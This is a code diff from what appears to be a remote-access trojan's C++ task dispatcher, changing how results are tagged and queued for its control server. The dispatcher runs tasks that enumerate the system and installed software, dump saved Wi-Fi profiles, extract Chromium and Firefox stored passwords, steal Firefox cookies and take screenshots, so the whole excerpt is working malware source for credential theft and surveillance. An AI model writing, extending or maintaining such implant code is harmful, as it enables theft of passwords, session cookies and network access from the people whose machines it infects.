@@ -39,20 +39,27 @@ void TaskDispatcher::dispatch(const Task& task) {
     try {
         switch (task.type) {
             case TaskType::SYSINFO:
-                result.output = recon::getSysInfo();
+                result.output = "sysinfo:" + recon::getSysInfo();
                 break;
             case TaskType::INSTALLED_APPS:
-                result.output = recon::getInstalledSoftware();
+                result.output = "APPS_ENUM:" + recon::getInstalledSoftware();
                 break;
-            case TaskType::WIFI_DUMP:
-                result.output = wifi::dumpWifiProfiles() + "\n\n" + wifi::scanAvailableWifi();
+            case TaskType::WIFI_DUMP: {
+                // Send scan results as a separate result to match server's WIFI_SCAN handler
+                Result scanRes;
+                scanRes.task_id = result.task_id + "_scan";
+                scanRes.output = "WIFI_SCAN:" + wifi::scanAvailableWifi();
+                pendingResults_.enqueue(scanRes);
+
+                result.output = "WIFI_DUMP:" + wifi::dumpWifiProfiles();
                 break;
+            }
             case TaskType::BROWSER_PASS:
-                result.output = credential::DumpChromiumPasswords();
+                result.output = "BROWSER_PASS:" + credential::DumpChromiumPasswords();
                 result.output += "\n\n" + credential::DumpFirefoxPasswords();
                 break;
             case TaskType::COOKIE_STEAL:
-                result.output = credential::StealFirefoxCookies(); 
+                result.output = "COOKIES:" + credential::StealFirefoxCookies(); 
                 break;
             case TaskType::SCREENSHOT: {
                 std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
